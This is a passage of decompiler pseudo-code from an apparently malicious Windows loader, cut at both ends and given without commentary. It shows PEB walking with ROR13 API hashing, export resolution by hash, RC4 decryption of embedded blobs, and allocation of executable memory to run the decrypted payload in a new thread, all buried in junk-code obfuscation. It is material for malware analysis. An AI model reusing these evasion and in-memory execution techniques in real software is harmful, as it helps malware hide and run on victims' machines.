  if ( (v5 & v20 & 0x80000000) != 0 )
    return -(v5 < v12);
  result = (unsigned __int8)v26 + 2710;
  if ( v21 != 13387 )
  {
    result = 0;
    if ( v24 >= 0 )
    {
LABEL_16:
      v5 = v14;
      v22 += v14 + 1;
      return -(v5 < v12);
    }
  }
  return result;
}
// 401E9A: variable 'v6' is possibly undefined
// 401EB2: variable 'v13' is possibly undefined
// 402F94: variable 'v14' is possibly undefined
// 40332F: variable 'v12' is possibly undefined

//----- (00404657) --------------------------------------------------------
int __stdcall sub_404657(int a1, int a2, int a3, int a4)
{
  int v4; // edx
  unsigned int v5; // ecx
  int v7; // [esp-E4h] [ebp-E8h]
  int v8; // [esp-C0h] [ebp-C4h] BYREF
  int v9; // [esp-B4h] [ebp-B8h] BYREF

  sub_404A0E((int)&v9, v7, 48, 0);
  sub_4025F3(14, -222238613, -701066520);
  return sub_402E23(v5, v4, 54, (int)&v8, v4, 2);
}
// 40443B: variable 'v7' is possibly undefined
// 4032D8: variable 'v5' is possibly undefined
// 4032D8: variable 'v4' is possibly undefined

//----- (00404A0E) --------------------------------------------------------
void __stdcall sub_404A0E(int a1, int a2, int a3, int a4)
{
  ;
}

//----- (00404A4A) --------------------------------------------------------
int __thiscall sub_404A4A(void *this, int a2, int a3)
{
  int v3; // edx
  int v4; // eax
  char v6[80]; // [esp+1FCh] [ebp-50h] BYREF

  sub_4041D8((unsigned int)this, (__int16)v6, (int)v6);
  sub_403F1F(55, v3);
  return v4 + 1757;
}
// 404A6F: variable 'v3' is possibly undefined
// 404A79: variable 'v4' is possibly undefined

//----- (00404C0E) --------------------------------------------------------
int __stdcall sub_404C0E(int a1)
{
  int v2; // eax

  sub_402B2C();
  sub_402B2C();
  return (v2 ^ 0x2A02) + 526;
}
// 4021EA: variable 'v2' is possibly undefined

//----- (00404F06) --------------------------------------------------------
int __fastcall sub_404F06(int a1, unsigned int a2, int a3)
{
  int result; // eax
  __int16 v4; // ax
  unsigned int v5; // eax
  bool v6; // cf
  unsigned __int16 v7; // [esp+78h] [ebp-174h]
  unsigned int v8; // [esp+A8h] [ebp-144h]
  unsigned __int16 v9; // [esp+1D0h] [ebp-1Ch]
  unsigned __int8 v10; // [esp+1E4h] [ebp-8h]

  v5 = v10 | 0xC25;
  v6 = a2 < v5;
  if ( a2 >= v5 )
  {
    v5 = v7 - 23173;
    v6 = __PAIR64__(v8, (unsigned int)v7 - 13955) < __PAIR64__(v5, 9218);
  }
  v4 = ((v6 + (_WORD)v5 + 7330) | 0x4DD) + 5273;
  result = v4 & 0xE50;
  if ( result == a2 )
    result = v9 | 0x3ABF;
  return result;
}
// 404F25: variable 'v10' is possibly undefined
// 4028BB: variable 'v9' is possibly undefined
// 40289F: variable 'v7' is possibly undefined
// 40232F: variable 'v8' is possibly undefined

//----- (00404F45) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_404F45(int a1@<eax>, int a2@<edx>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_402F63(a1, a2, (int)&savedregs);
}
// 404F48: bad sp value at call

//----- (004055B4) --------------------------------------------------------
void __stdcall sub_4055B4(int a1)
{
  sub_402B32();
}

//----- (0040597F) --------------------------------------------------------
int __fastcall sub_40597F(int a1, int a2, int a3, int a4, int a5)
{
  unsigned int v5; // edx
  int v6; // ecx
  int v7; // ecx
  int v9; // [esp+ACh] [ebp-184h]
  int v10; // [esp+108h] [ebp-128h]

  sub_403F1F(47, a2);
  sub_403F1F(33, -1444473090);
  sub_404F06(v6, v5, v9);
  return sub_4025F3(36, v7, v10) ^ 0x88B;
}
// 402BB7: variable 'v6' is possibly undefined
// 402BB7: variable 'v5' is possibly undefined
// 402BB7: variable 'v9' is possibly undefined
// 403368: variable 'v7' is possibly undefined
// 403368: variable 'v10' is possibly undefined

//----- (00405E8D) --------------------------------------------------------
_BYTE *__cdecl sub_405E8D(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (00406389) --------------------------------------------------------
int __usercall sub_406389@<eax>(int a1@<ebx>, int a2@<edi>, int a3)
{
  _DWORD *v3; // edi
  int v4; // ebx
  unsigned int i; // esi
  unsigned __int16 *v7; // [esp+18h] [ebp-Ch]
  _DWORD *v8; // [esp+1Ch] [ebp-8h]
  int v9; // [esp+20h] [ebp-4h]

  v4 = sub_4075ED(a1, a2);
  v3 = (_DWORD *)(v4 + *(_DWORD *)(v4 + *(_DWORD *)(v4 + 60) + 120));
  if ( HIWORD(a3) )
  {
    v8 = (_DWORD *)(v4 + v3[8]);
    v7 = (unsigned __int16 *)(v4 + v3[9]);
    for ( i = 0; v3[6] > i; ++i )
    {
      if ( sub_4064B4((_BYTE *)(v4 + *v8)) == a3 )
      {
        v9 = *v7;
        break;
      }
      ++v8;
      ++v7;
    }
    if ( v3[6] == i )
      return 0;
  }
  else
  {
    v9 = (unsigned __int16)a3 - v3[4];
  }
  return v4 + *(_DWORD *)(v4 + v3[7] + 4 * v9);
}
// 4077BE: variable 'v9' is possibly undefined

//----- (004064B4) --------------------------------------------------------
unsigned int __cdecl sub_4064B4(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (0040675C) --------------------------------------------------------
int __cdecl sub_40675C(int a1, int a2, unsigned __int8 *a3)
{
  int result; // eax
  unsigned int v4; // esi
  _BYTE *v5; // eax
  unsigned __int8 v6; // bl
  unsigned int i; // esi
  char v8; // cl
  unsigned __int8 *v9; // [esp+Ch] [ebp-8h]
  unsigned __int8 v10; // [esp+13h] [ebp-1h]

  v4 = 0;
  v5 = a3;
  do
  {
    v8 = v4++;
    *v5++ = v8;
  }
  while ( v4 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v10 = 0;
  v6 = 0;
  v9 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v6 = (v6 + *v9 + *(unsigned __int8 *)(a1 + v10)) % 256;
    sub_405E8D(&a3[i], &a3[v6]);
    result = (v10 + 1) / a2;
    v10 = (v10 + 1) % a2;
    ++v9;
  }
  return result;
}

//----- (00406F23) --------------------------------------------------------
__int64 __usercall sub_406F23@<edx:eax>(unsigned __int8 a1@<dh>)
{
  unsigned int v1; // kr00_4
  bool v2; // cc
  __int64 result; // rax

  v2 = a1 <= (unsigned __int8)byte_43C124;
  BYTE5(result) = a1 - byte_43C124;
  if ( !v2 )
  {
    v1 = __readeflags();
    __asm { retn }
  }
  return result;
}
// 43C124: using guessed type char byte_43C124;

//----- (00406F6B) --------------------------------------------------------
unsigned int __fastcall sub_406F6B(int a1, int a2)
{
  unsigned int result; // eax
  signed int retaddr; // [esp+0h] [ebp+0h]

  dword_43C03C += 6872;
  dword_43D6A9 ^= a2 + 377;
  result = retaddr & 0xFFFF0000;
  dword_43D681 = retaddr & 0xFFFF0000;
  dword_43C024 -= 4420;
  dword_43C034 -= retaddr;
  return result;
}
// 43C024: using guessed type int dword_43C024;
// 43C034: using guessed type int dword_43C034;
// 43C03C: using guessed type int dword_43C03C;
// 43D681: using guessed type int dword_43D681;
// 43D6A9: using guessed type int dword_43D6A9;

//----- (004075ED) --------------------------------------------------------
int __usercall sub_4075ED@<eax>(int a1@<ebx>, int a2@<edi>)
{
  int v2; // edi
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // edx
  int v6; // ecx
  _BYTE *v7; // esi
  int v8; // ebx
  int result; // eax

  dword_43C04C += a1;
  dword_43C014 += a2 - 1;
  v5 = (_DWORD *)*((_DWORD *)NtCurrentPeb()->ImageBaseAddress + 5);
  do
  {
    v7 = (_BYTE *)v5[10];
    dword_43C038 = 2672;
    v6 = 24;
    v2 = 0;
    do
    {
      v3 = dword_43C650;
      v4 = 0;
      LOBYTE(dword_43C03C) = 59;
      dword_43C034 += 13800;
      LOBYTE(v4) = *v7++;
      LOBYTE(v3) = byte_43D92C;
      if ( (char)v4 >= 97 )
      {
        v3 = 15127;
        LOBYTE(v4) = v4 - 32;
      }
      dword_43C018 -= v3;
      v2 = v4 + __ROR4__(v2, 13);
      LOBYTE(dword_43C038) = dword_43C038 + 49;
      --v6;
    }
    while ( v6 );
    dword_43C008 += (int)v7;
    v8 = v5[4];
    v5 = (_DWORD *)*v5;
  }
  while ( v2 != 1783282779 );
  result = v8;
  dword_43C034 -= (int)v5;
  dword_43C024 = 23605;
  return result;
}
// 43C008: using guessed type int dword_43C008;
// 43C014: using guessed type int dword_43C014;
// 43C018: using guessed type int dword_43C018;
// 43C024: using guessed type int dword_43C024;
// 43C034: using guessed type int dword_43C034;
// 43C038: using guessed type int dword_43C038;
// 43C03C: using guessed type int dword_43C03C;
// 43C04C: using guessed type int dword_43C04C;
// 43C650: using guessed type int dword_43C650;
// 43D92C: using guessed type char byte_43D92C;

//----- (0040760F) --------------------------------------------------------
void __usercall sub_40760F(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  LOBYTE(dword_43C01C) = 3;
  qmemcpy(a2, a3, a1);
}
// 43C01C: using guessed type int dword_43C01C;

//----- (004076E8) --------------------------------------------------------
void __usercall sub_4076E8(void *a1@<eax>)
{
  int v1; // ebx
  char v2; // ah
  int v3; // ebx
  bool v4; // cf
  int v5; // edx

  LOBYTE(dword_43C04C) = -96;
  LOBYTE(dword_43C048) = -47;
  LOBYTE(dword_43C02C) = dword_43C02C - 33;
  sub_40760F(0x5A97u, a1, &unk_40C1F2);
  v1 = 4870;
  v4 = __CFADD__(dword_43C020, 3573);
  dword_43C020 += 3573;
  LOBYTE(v1) = v2;
  dword_43C014 = (int)&VirtualAlloc + v4 + 20877;
  sub_40760F(0x2D46u, a1, &unk_411EC2);
  v3 = 4 * v1 + 19569;
  dword_43C02C -= v3;
  dword_43C038 -= v3;
  dword_43C008 += 17842;
  sub_40760F(0xCBBBu, a1, &unk_414F0F);
  dword_43C01C += v5;
  dword_43C014 -= v3;
}
// 40606B: variable 'v2' is possibly undefined
// 407FB4: variable 'v5' is possibly undefined
// 43C008: using guessed type int dword_43C008;
// 43C014: using guessed type int dword_43C014;
// 43C01C: using guessed type int dword_43C01C;
// 43C020: using guessed type int dword_43C020;
// 43C02C: using guessed type int dword_43C02C;
// 43C038: using guessed type int dword_43C038;
// 43C048: using guessed type int dword_43C048;
// 43C04C: using guessed type int dword_43C04C;

//----- (00407BF9) --------------------------------------------------------
int __usercall sub_407BF9@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int result; // eax
  unsigned int v3; // ebx
  int v4; // ebx
  int v5; // ebx
  unsigned int v6; // eax

  dword_43C018 += a2;
  v5 = 10240;
  BYTE1(v5) = dword_43D845;
  dword_43C024 += v5;
  BYTE1(v5) = byte_43CFC4;
  v6 = dword_43D845 ^ (dword_43D845 << 11);
  dword_43C034 += v5;
  LOBYTE(dword_43C030) = dword_43C030 + 4;
  dword_43C014 = (8886 - a1) ^ 0x46ED;
  dword_43D845 = dword_43D841;
  v3 = v6 + 9762;
  LOBYTE(v3) = v6 + v6 + 34;
  dword_43D841 = dword_43D723;
  BYTE1(v3) = ((unsigned __int16)(v6 + 9762) >> 8) - byte_43C78C;
  v4 = ((unsigned __int8)((unsigned __int16)(v6 + 9762) >> 8) < (unsigned __int8)byte_43C78C) + v3 + 11575;
  dword_43C030 -= 9682;
  dword_43D723 = dword_43D703;
  LOBYTE(dword_43C024) = -11;
  LOBYTE(v4) = __CFSHR__(dword_43D703, 19) + v4 + 121;
  BYTE1(v4) = -47;
  dword_43C00C = v4;
  dword_43C04C -= dword_43D66C + 28082;
  dword_43D703 ^= (v6 >> 8) ^ v6 ^ ((unsigned int)dword_43D703 >> 19);
  dword_43D6B1 = dword_43D703;
  LOBYTE(dword_43C010) = -74;
  result = dword_43D703;
  dword_43C024 -= (int)&InterlockedIncrement;
  return result;
}
// 43C00C: using guessed type int dword_43C00C;
// 43C010: using guessed type int dword_43C010;
// 43C014: using guessed type int dword_43C014;
// 43C018: using guessed type int dword_43C018;
// 43C024: using guessed type int dword_43C024;
// 43C030: using guessed type int dword_43C030;
// 43C034: using guessed type int dword_43C034;
// 43C04C: using guessed type int dword_43C04C;
// 43C78C: using guessed type char byte_43C78C;
// 43CFC4: using guessed type char byte_43CFC4;
// 43D66C: using guessed type int dword_43D66C;
// 43D6B1: using guessed type int dword_43D6B1;
// 43D703: using guessed type int dword_43D703;
// 43D723: using guessed type int dword_43D723;
// 43D841: using guessed type int dword_43D841;
// 43D845: using guessed type int dword_43D845;

//----- (00407D4B) --------------------------------------------------------
int (__thiscall *sub_407D4B())(_DWORD, _DWORD, _DWORD, _DWORD)
{
  int v0; // ebx
  int v1; // eax
  int v2; // ebx
  int v3; // esi
  int v4; // edx
  unsigned int v5; // ecx
  unsigned __int64 v6; // rdi
  int v7; // ebx
  __int64 v8; // rax
  _BYTE *v9; // edi
  _BYTE *v10; // esi
  int v11; // edx
  bool v12; // cf
  int v13; // ebx
  int v14; // ecx
  _BYTE *v15; // edi
  bool v16; // cf
  int v17; // ecx
  int (__thiscall *result)(_DWORD, _DWORD, _DWORD, _DWORD); // eax
  unsigned int v19; // ebx
  unsigned int v20; // ebx
  int v21; // ebx
  BOOL v22; // ett
  int v23; // eax
  int v24; // eax
  void (__stdcall **v25)(LPCRITICAL_SECTION); // ebx
  int v26; // ecx
  int v27; // ecx
  int v28; // ebx
  _BYTE *v29; // edi
  int v30; // ebx
  int (__stdcall **v31)(UINT, DWORD, LPCCH, int, LPWSTR, int); // esi
  int v32; // ecx
  int v33; // ebx
  unsigned int v34; // eax
  __int64 v35; // rax
  _BYTE *v36; // esi
  char v37; // al
  int v38; // edx
  int v39; // esi
  int v40; // ebx
  int v41; // [esp-8h] [ebp-8h]
  int v42; // [esp-4h] [ebp-4h]

  v31 = &MultiByteToWideChar;
  v32 = 0x2000;
  v15 = &unk_421DD6;
  v16 = 1;
  do
  {
    v42 = v32;
    dword_43C028 -= (int)&HeapAlloc;
    v34 = sub_407BF9(v32, (int)v31 + v16 + 24989);
    *v15++ = v34;
    v16 = v34 < *(_DWORD *)((char *)&loc_43CD09 + 3);
    v31 = (int (__stdcall **)(UINT, DWORD, LPCCH, int, LPWSTR, int))(v34 - *(_DWORD *)((char *)&loc_43CD09 + 3));
    v32 = v42 - 1;
  }
  while ( v42 != 1 );
  dword_43C040 += dword_43D8F4;
  v23 = dword_43D71B(-dword_43CFEC, 255, &unk_421CD6);
  dword_43C048 -= (int)v31;
  LOBYTE(dword_43C018) = dword_43C018 + 11;
  dword_43C014 = v23;
  dword_43C020 -= 24758;
  dword_43C01C += 29598;
  dword_43D6D5(&unk_421CD6, &unk_43D6FD, 0, 4446006);
  dword_43C04C = 23105;
  dword_43C018 = 22616;
  dword_43C00C += 18841;
  v35 = dword_43D689(dword_43D160, &GetModuleHandleA, 4446006, -1073741824, 1, 0, 2, 32, 0);
  dword_43C00C += HIDWORD(v35);
  v17 = dword_43C7FC + dword_43C4DC;
  dword_43C03C -= dword_43C7FC + dword_43C4DC;
  BYTE1(v17) = byte_43D974 + ((unsigned __int16)(dword_43C7FC + dword_43C4DC) >> 8);
  LOBYTE(dword_43C028) = 81;
  dword_43C00C += v17;
  dword_43D691(v35, &unk_421DD6, 0x2000, 4445971, 0, v35);
  dword_43D695();
  v12 = (unsigned __int8)dword_43C04C < 0x65u;
  LOBYTE(dword_43C04C) = dword_43C04C - 101;
  dword_43C02C = 10157;
  LOBYTE(dword_43C028) = 66;
  dword_43C01C = dword_43D894;
  dword_43C020 = 30705;
  v27 = 0x2000;
  v28 = dword_43C784;
  v29 = &unk_421DD6;
  dword_43C024 = dword_43C784;
  do
  {
    v0 = v12 + v28 + 12150;
    v41 = v27;
    v36 = v29;
    v37 = sub_407BF9(v27, (int)v29);
    LOBYTE(v0) = byte_43D024;
    *v29++ = v37;
    BYTE1(v0) = *(&loc_43C2B7 + 1);
    v39 = (int)&v36[dword_43C0E0 - 1];
    v16 = (unsigned int)dword_43C030 < 0x229F;
    dword_43C030 -= 8863;
    v22 = v16;
    v16 = __CFADD__(v16, v0);
    v21 = v22 + v0;
    v12 = v16 | __CFADD__(v21, 3571);
    v28 = v21 + 3571;
    v27 = v41 - 1;
  }
  while ( v41 != 1 );
  v16 = __CFADD__(v39, dword_43C02C);
  dword_43C02C += v39;
  v3 = v39 + 1;
  v33 = v3 + v16 + v38 + 22503;
  v16 = __PAIR64__(v33, v3) < ((unsigned int)off_43CEAC | 0x41F700000000ui64);
  v19 = (__PAIR64__(v33, v3) - ((unsigned int)off_43CEAC | 0x41F700000000i64)) >> 32;
  result = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389(v19, v16 + 6315, 1769630462);
  LOBYTE(v19) = byte_43C87C;
  v20 = v19 >> 1;
  if ( !result )
    goto LABEL_18;
  *(int *)((char *)&dword_43D710 + 3) = (int)result;
  v13 = v20 - 1;
  result = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389(v13, dword_43CA20, 976580703);
  LOBYTE(v13) = v13 - byte_43CB5C;
  LOBYTE(dword_43C020) = dword_43C020 - 64;
  if ( result
    && (dword_43D6DD = result,
        LOBYTE(dword_43C028) = -29,
        dword_43C018 = v13,
        LOBYTE(v13) = v13 - byte_43CF04,
        result = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(int (__fastcall **)(int, HANDLE (__stdcall **)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD), _DWORD, int, int, int))((char *)&dword_43D710 + 3))(
                                                                       5695,
                                                                       &CreateThread,
                                                                       0,
                                                                       0x2000,
                                                                       12288,
                                                                       64),
        LOBYTE(dword_43C020) = 93,
        result) )
  {
    v40 = v13 ^ 0x7C80;
    dword_43D70B = (int)result;
    BYTE1(v40) = byte_43CAD0;
    v4 = 4335;
    v5 = (unsigned int)&FreeLibrary + ((unsigned int)&FreeLibrary < 0x297F) - 492;
    HIDWORD(v6) = v5;
    v16 = dword_43C020 < v5;
    dword_43C020 -= v5;
    LOBYTE(v4) = -17 - (v16 - 101);
    LODWORD(v6) = &LoadLibraryA;
    v7 = dword_43C3D0
       + (__CFADD__((unsigned int)&FreeLibrary < 0x297F, (char *)&FreeLibrary - 10623) | __CFADD__(
                                                                                           (char *)&FreeLibrary
                                                                                         + ((unsigned int)&FreeLibrary < 0x297F)
                                                                                         - 10623,
                                                                                           10131))
       + v40
       + 3868;
    v8 = dword_43D689(v5, v4, 4446006, -1073741824, 1, 0, 3, 0, 0);
    LOBYTE(v7) = ((unsigned __int16)((v6 < 0x41E900004AE8i64) + WORD2(v8) + 28499) >> 8) - byte_43C540;
    dword_43C038 -= dword_43D330;
    LOBYTE(dword_43C020) = dword_43C020 + 121;
    dword_43D6E5(v8, dword_43D70B, 0x2000, &unk_421CD6, 0, v8);
    v30 = dword_43D3BC + v7;
    dword_43C004 = (int)&LoadLibraryA;
    dword_43D695();
    BYTE1(v30) = byte_43D480;
    v24 = dword_43D6F1(dword_43C36C, (char *)&DeleteCriticalSection - dword_43DA90, 4446006);
    v2 = unk_43CE1C + v30;
    v26 = 0x2000;
    LOBYTE(v2) = v2 - BYTE1(v24);
    BYTE1(v2) = -27;
    v10 = (_BYTE *)dword_43D70B;
    dword_43C004 = v2;
    v11 = 0;
    dword_43C014 += v2;
    v1 = 0;
    v25 = &EnterCriticalSection;
    do
    {
      LOBYTE(v1) = *v10++;
      BYTE1(v25) = byte_43DA48;
      v11 += v1;
      dword_43C004 += (int)v25;
      v1 = 0;
      LOBYTE(v25) = byte_43C9C0;
      --v26;
    }
    while ( v26 );
    dword_43D6AD = v11;
    dword_43C008 += __CFADD__(dword_43C968, v10) + v11 + 25073;
    LOBYTE(dword_43C028) = dword_43C028 - 1;
    dword_43D6DD(BYTE1(v11), dword_43D70B, 0, 0x8000);
    result = 0;
    v14 = 0x2000;
    v9 = &unk_421DD6;
    LOBYTE(dword_43C020) = -89;
    do
    {
      *v9++ = 0;
      --v14;
    }
    while ( v14 );
  }
  else
  {
LABEL_18:
    dword_43C048 += 15643;
  }
  return result;
}
// 43D6DD: invalid function type has been ignored
// 406079: conditional instruction was optimized away because of '%0x18.4==1'
// 406BC2: variable 'v38' is possibly undefined
// 43C004: using guessed type int dword_43C004;
// 43C008: using guessed type int dword_43C008;
// 43C00C: using guessed type int dword_43C00C;
// 43C014: using guessed type int dword_43C014;
// 43C018: using guessed type int dword_43C018;
// 43C01C: using guessed type int dword_43C01C;
// 43C020: using guessed type int dword_43C020;
// 43C024: using guessed type int dword_43C024;
// 43C028: using guessed type int dword_43C028;
// 43C02C: using guessed type int dword_43C02C;
// 43C030: using guessed type int dword_43C030;
// 43C038: using guessed type int dword_43C038;
// 43C03C: using guessed type int dword_43C03C;
// 43C040: using guessed type int dword_43C040;
// 43C048: using guessed type int dword_43C048;
// 43C04C: using guessed type int dword_43C04C;
// 43C0E0: using guessed type int dword_43C0E0;
// 43C36C: using guessed type int dword_43C36C;
// 43C3D0: using guessed type int dword_43C3D0;
// 43C4DC: using guessed type int dword_43C4DC;
// 43C540: using guessed type char byte_43C540;
// 43C784: using guessed type int dword_43C784;
// 43C7FC: using guessed type int dword_43C7FC;
// 43C87C: using guessed type char byte_43C87C;
// 43C968: using guessed type int dword_43C968;
// 43C9C0: using guessed type char byte_43C9C0;
// 43CA20: using guessed type int dword_43CA20;
// 43CAD0: using guessed type char byte_43CAD0;
// 43CB5C: using guessed type char byte_43CB5C;
// 43CEAC: using guessed type void *off_43CEAC;
// 43CF04: using guessed type char byte_43CF04;
// 43CFEC: using guessed type int dword_43CFEC;
// 43D024: using guessed type char byte_43D024;
// 43D160: using guessed type int dword_43D160;
// 43D330: using guessed type int dword_43D330;
// 43D3BC: using guessed type int dword_43D3BC;
// 43D480: using guessed type char byte_43D480;
// 43D689: using guessed type __int64 (__fastcall *dword_43D689)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43D68D: using guessed type int dword_43D68D;
// 43D691: using guessed type int (__stdcall *dword_43D691)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43D695: using guessed type int (*dword_43D695)(void);
// 43D6AD: using guessed type int dword_43D6AD;
// 43D6D5: using guessed type int (__stdcall *dword_43D6D5)(_DWORD, _DWORD, _DWORD, _DWORD);
// 43D6DD: using guessed type int (__thiscall *dword_43D6DD)(_DWORD, _DWORD, _DWORD, _DWORD);
// 43D6E5: using guessed type int (__stdcall *dword_43D6E5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43D6F1: using guessed type int (__fastcall *dword_43D6F1)(_DWORD, _DWORD, _DWORD);
// 43D70B: using guessed type int dword_43D70B;
// 43D710: using guessed type int dword_43D710;
// 43D713: using guessed type int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43D71B: using guessed type int (__thiscall *dword_43D71B)(_DWORD, _DWORD, _DWORD);
// 43D894: using guessed type int dword_43D894;
// 43D8F4: using guessed type int dword_43D8F4;
// 43D974: using guessed type char byte_43D974;
// 43DA48: using guessed type char byte_43DA48;
// 43DA90: using guessed type int dword_43DA90;

//----- (00407E84) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int (__stdcall *__usercall sub_407E84@<eax>(__int16 a1@<bx>, int a2@<edi>))(_DWORD, _DWORD, _DWORD, _DWORD)
{
  int v2; // edi
  unsigned int v3; // ecx
  int v4; // edi
  int v5; // edi
  int v6; // ebx
  __int16 v7; // bx
  int v8; // edi
  int v9; // ebx
  int v10; // edx
  int v11; // esi
  int v12; // ebx
  int v13; // ebx
  int v14; // edi
  int (__stdcall *result)(_DWORD, _DWORD, _DWORD, _DWORD); // eax
  bool v16; // cf
  int v17; // [esp-8h] [ebp-8h]
  int v18; // [esp-4h] [ebp-4h]

  v14 = a2 - 1;
  dword_43C044 += 29987;
  result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389(a1, v14, 262468866);
  if ( result )
  {
    dword_43C004 += v17;
    dword_43C018 += 27075;
    dword_43D6D5 = result;
    LOBYTE(a1) = byte_43C900;
    v2 = dword_43CBBC + v14 - dword_43D274;
    result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389(a1, v2, 1493072574);
    v4 = (v3 < (unsigned int)v16 + 17374) + v2 + 24973;
    if ( result )
    {
      v13 = dword_43D098;
      dword_43D71B = (int (__thiscall *)(_DWORD, _DWORD, _DWORD))result;
      result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389(
                                                                    (unsigned __int16)dword_43D098,
                                                                    v4 - dword_43C264,
                                                                    150532372);
      v9 = dword_43D464 + v13;
      if ( result )
      {
        v16 = (unsigned int)dword_43C004 < 0x5331;
        dword_43C004 -= 21297;
        dword_43D689 = (__int64 (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
        result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389(
                                                                      (unsigned __int16)v9,
                                                                      27487 - (v16 + v9),
                                                                      1916711125);
        dword_43C024 = 24733;
        dword_43C048 -= v10;
        LOBYTE(dword_43C038) = 35;
        if ( result )
        {
          v12 = v9 ^ 0x6B;
          dword_43D695 = (int (*)(void))result;
          v11 = v10;
          result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389(
                                                                        (unsigned __int16)v12,
                                                                        (char)v10,
                                                                        -2114916129);
          BYTE1(v12) = -114;
          if ( result )
          {
            dword_43D6F1 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))result;
            v6 = dword_43D710 + v12;
            v5 = v6;
            dword_43C048 = v6;
            result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389((unsigned __int16)v6, v6, 1216340331);
            LOBYTE(v6) = dword_43C510 + v6;
            v7 = v6 | 0x60AB;
            LOBYTE(dword_43C018) = -44;
            v8 = v5 + 28359;
            if ( result )
            {
              dword_43D6E5 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
              dword_43C01C = v11;
              result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_406389(v7, v8 - dword_43D7CC, 255840707);
              LOBYTE(dword_43C010) = -13;
              if ( result )
              {
                dword_43C018 += v18;
                dword_43D691 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
                sub_407D4B();
                dword_43C020 = 25463;
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  dword_43C048 += 15643;
  return result;
}
// 40626D: positive sp value 8 has been found
// 405AFE: variable 'v17' is possibly undefined
// 405B3D: variable 'v3' is possibly undefined
// 405B3D: variable 'v16' is possibly undefined
// 40658D: variable 'v18' is possibly undefined
// 40706F: variable 'v10' is possibly undefined
// 43C004: using guessed type int dword_43C004;
// 43C010: using guessed type int dword_43C010;
// 43C018: using guessed type int dword_43C018;
// 43C01C: using guessed type int dword_43C01C;
// 43C020: using guessed type int dword_43C020;
// 43C024: using guessed type int dword_43C024;
// 43C038: using guessed type int dword_43C038;
// 43C044: using guessed type int dword_43C044;
// 43C048: using guessed type int dword_43C048;
// 43C264: using guessed type int dword_43C264;
// 43C510: using guessed type int dword_43C510;
// 43C900: using guessed type char byte_43C900;
// 43CBBC: using guessed type int dword_43CBBC;
// 43D098: using guessed type int dword_43D098;
// 43D274: using guessed type int dword_43D274;
// 43D464: using guessed type int dword_43D464;
// 43D681: using guessed type int dword_43D681;
// 43D689: using guessed type __int64 (__fastcall *dword_43D689)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43D691: using guessed type int (__stdcall *dword_43D691)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43D695: using guessed type int (*dword_43D695)(void);
// 43D6AD: using guessed type int dword_43D6AD;
// 43D6D5: using guessed type int (__stdcall *dword_43D6D5)(_DWORD, _DWORD, _DWORD, _DWORD);
// 43D6E5: using guessed type int (__stdcall *dword_43D6E5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43D6F1: using guessed type int (__fastcall *dword_43D6F1)(_DWORD, _DWORD, _DWORD);
// 43D710: using guessed type int dword_43D710;
// 43D71B: using guessed type int (__thiscall *dword_43D71B)(_DWORD, _DWORD, _DWORD);
// 43D7CC: using guessed type int dword_43D7CC;

//----- (00408029) --------------------------------------------------------
unsigned __int8 __cdecl sub_408029(int a1, int a2, _BYTE *a3, unsigned int a4)
{
  unsigned __int8 v5[260]; // [esp+8h] [ebp-104h] BYREF

  sub_40675C(a1, a2, v5);
  return sub_40855B(a3, a4, (int)v5);
}

//----- (0040855B) --------------------------------------------------------
unsigned __int8 __cdecl sub_40855B(_BYTE *a1, unsigned int a2, int a3)
{
  unsigned __int8 result; // al
  unsigned __int8 v4; // bl
  unsigned int i; // [esp+10h] [ebp-8h]
  unsigned __int8 v7; // [esp+17h] [ebp-1h]

  v4 = *(_BYTE *)(a3 + 256);
  v7 = *(_BYTE *)(a3 + 257);
  for ( i = 0; i < a2; ++a1 )
  {
    v4 = (v4 + 1) % 256;
    v7 += *(_BYTE *)(a3 + v4);
    sub_405E8D((_BYTE *)(a3 + v4), (_BYTE *)(a3 + v7));
